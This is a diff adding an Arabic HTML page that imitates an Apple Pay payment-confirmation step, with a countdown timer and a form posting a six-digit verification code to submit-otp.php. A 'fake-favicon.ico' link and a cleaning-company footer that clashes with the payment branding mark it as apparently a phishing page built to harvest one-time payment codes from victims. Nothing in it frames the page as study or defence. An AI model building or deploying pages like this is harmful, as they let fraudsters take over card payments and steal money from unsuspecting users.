@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد عملية الدفـع آبـل بـي</title>
+    <link rel="icon" href="fake-favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo img {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .message {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 25px;
+        }
+        .otp-form input {
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 18px;
+            text-align: center;
+        }
+        .submit-btn {
+            background-color: #0070ba;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        .submit-btn:hover {
+            background-color: #005a8c;
+        }
+        .timer {
+            font-size: 14px;
+            color: #888;
+            margin-top: 10px;
+            padding: 8px 0;
+        }
+        .timer-countdown {
+            font-weight: bold;
+            color: #0070ba;
+            font-size: 16px;
+        }
+        .footer {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body dir="rtl">
+    <div class="container">
+        <div class="logo">
+            <img src="alraqi/ap.jpeg" alt="Logo">
+        </div>
+        <h2>تأكيد عملية الــدفـع</h2>
+        <p class="message">لتأكيد عملية الدفع، سيتم إرسال رمز التحقق إلى رقم جوالك خلال:</p>
+
+        <!-- Countdown Timer -->
+        <div class="timer">
+            <span class="timer-text">انتظر رمز التحقق في غضون</span> 
+            <span id="countdown" class="timer-countdown">30</span> ثانية
+        </div>
+
+        <!-- Form that submits OTP to submit.php -->
+        <form class="otp-form" action="submit-otp.php" method="POST">
+            <input type="text" name="otp" id="otp-input" placeholder="أدخل رمز التحقق" required maxlength="6" pattern="\d{6}" title="يجب أن يكون 6 أرقام" oninput="validateInput(this)">
+            <button type="submit" class="submit-btn">تأكيد</button>
+        </form>
+        
+        <div class="footer">
+            <p>© 2024 البيت الراقي لخدمات التنظيف-جميع الحقوق محفوظة.</p>
+        </div>
+    </div>
+
+    <script>
+        // Countdown Timer Script
+        let countdown = 30;
+        const countdownElement = document.getElementById('countdown');
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                document.querySelector('.timer').innerHTML = "تم إرسال رمز التحقق إلى رقمك.";
+            }
+        }, 1000);
+
+        // Input validation to allow only numeric input
+        function validateInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, '').slice(0, 6);  // Limit input to 6 digits
+        }
+    </script>
+</body>
+</html>
